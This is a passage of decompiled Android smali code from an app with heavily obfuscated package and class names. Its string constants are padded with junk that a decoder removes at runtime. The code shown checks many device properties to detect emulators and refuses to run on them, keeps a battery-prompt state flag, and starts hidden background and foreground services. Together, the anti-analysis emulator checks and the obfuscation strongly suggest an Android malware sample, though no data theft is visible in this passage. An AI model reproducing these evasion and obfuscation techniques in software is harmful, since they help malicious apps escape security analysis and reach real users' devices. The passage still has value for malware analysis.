    const-string v1, "OK"

    goto :goto_2

    :cond_5
    const-string v1, "\u00f6yk\u00fcn\u00fcc\u00fc alg\u0131land\u0131.\n bu uygulama \u00f6yk\u00fcn\u00fcc\u00fc ayg\u0131tlar\u0131 desteklemiyor"

    .line 513
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "Tamam"

    goto :goto_2

    :cond_6
    const-string v1, "\u68c0\u6d4b\u5230\u6a21\u62df\u5668.\n \u6b64\u5e94\u7528\u4e0d\u652f\u6301\u6a21\u62df\u5668\u8bbe\u5907"

    .line 508
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u597d\u7684"

    goto :goto_2

    :cond_7
    const-string v1, "\u062a\u0645 \u0627\u0643\u062a\u0634\u0627\u0641 \u0645\u062d\u0627\u0643\u064a.\n \u0647\u0630\u0627 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0644\u0627 \u064a\u062f\u0639\u0645 \u0623\u062c\u0647\u0632\u0629 \u0627\u0644\u0645\u062d\u0627\u0643\u064a"

    .line 503
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "\u0645\u0648\u0627\u0641\u0642"

    goto :goto_2

    :cond_8
    const-string v1, "Emulator detected.\n this app does not support emulator devices"

    .line 498
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v1, "ok"

    .line 524
    :goto_2
    :try_start_0
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 525
    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const v2, 0x7f0a001c

    .line 526
    invoke-virtual {p0, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_7

    .line 528
    :catch_0
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    .line 529
    :goto_3
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    const-string v3, "ask_battary"

    const-string v4, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    if-eqz v2, :cond_a

    .line 531
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 532
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_9

    .line 534
    sput-object v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 535
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_3

    .line 541
    :cond_9
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_3

    .line 544
    :cond_a
    :goto_4
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_c

    .line 546
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 547
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_b

    .line 549
    sput-object v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 550
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_4

    .line 556
    :cond_b
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_4

    .line 559
    :cond_c
    :goto_5
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_e

    .line 561
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 562
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    .line 564
    sput-object v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 565
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_5

    .line 571
    :cond_d
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_5

    .line 574
    :cond_e
    :goto_6
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_10

    .line 576
    sput-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 577
    sget-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_f

    .line 579
    sput-object v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 580
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_6

    .line 586
    :cond_f
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_6

    .line 594
    :cond_10
    :goto_7
    new-instance v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$6;

    invoke-direct {v2, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$6;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 605
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void
.end method

.method static synthetic access$000(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;)Landroid/webkit/ValueCallback;
    .locals 0

    .line 59
    iget-object p0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mUploadMessage:Landroid/webkit/ValueCallback;

    return-object p0
.end method

.method static synthetic access$002(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;Landroid/webkit/ValueCallback;)Landroid/webkit/ValueCallback;
    .locals 0

    .line 59
    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mUploadMessage:Landroid/webkit/ValueCallback;

    return-object p1
.end method

.method private isEmu_DIV_ID_lator()Z
    .locals 4

    .line 469
    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;

    const-string v1, "genmaxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55eric"

    const-string v2, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    invoke-static {v1, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->cegyolerywkhbglhweubkrtxyjobspzxdnujqwrzohudexlqal53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    const-string v3, "generic"

    invoke-virtual {v0, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    :cond_0
    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    .line 470
    invoke-static {v1, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->cegyolerywkhbglhweubkrtxyjobspzxdnujqwrzohudexlqal53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    const-string v1, "unknown"

    .line 471
    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;

    const-string v1, "goldfish"

    .line 472
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;

    const-string v1, "ranchu"

    .line 473
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v1, "google_sdk"

    .line 474
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v3, "Emulator"

    .line 475
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const-string v3, "Android SDK bmaxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55uilt for x86"

    .line 476
    invoke-static {v3, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->cegyolerywkhbglhweubkrtxyjobspzxdnujqwrzohudexlqal53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v3, "Genymotion"

    .line 477
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v3, "sdk_google"

    .line 478
    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    .line 479
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "sdk"

    .line 480
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "sdk_x86"

    .line 481
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "sdk_gphone6maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo554_arm64"

    .line 482
    invoke-static {v1, v2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->cegyolerywkhbglhweubkrtxyjobspzxdnujqwrzohudexlqal53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "vbox86p"

    .line 483
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "emulator"

    .line 484
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    const-string v1, "simulator"

    .line 485
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v0, 0x1

    :goto_1
    return v0
.end method

.method private isinternetOK(Landroid/content/Context;)Z
    .locals 1

    const-string v0, "connectivity"

    .line 284
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/net/ConnectivityManager;

    .line 285
    invoke-virtual {p1}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object p1

    if-eqz p1, :cond_0

    .line 286
    invoke-virtual {p1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result p1

    if-eqz p1, :cond_0

    const/4 p1, 0x1

    return p1

    :cond_0
    const/4 p1, 0x0

    return p1
.end method


# virtual methods
.method public Work(Landroid/content/Context;)V
    .locals 3

    .line 336
    :try_start_0
    const-class v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;

    invoke-static {v0, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb70;->noterpojpudlsqnsyayrkjxypkbheyslrmkteunecojquwszefzxh54(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 337
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 339
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 343
    :cond_0
    const-class v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;

    invoke-static {v0, p1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb70;->noterpojpudlsqnsyayrkjxypkbheyslrmkteunecojquwszefzxh54(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 344
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 345
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_1

    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->NeedNotifi()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 347
    invoke-virtual {p1, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 350
    :cond_1
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    :goto_0
    return-void
.end method

.method public finish()V
    .locals 2

    .line 1266
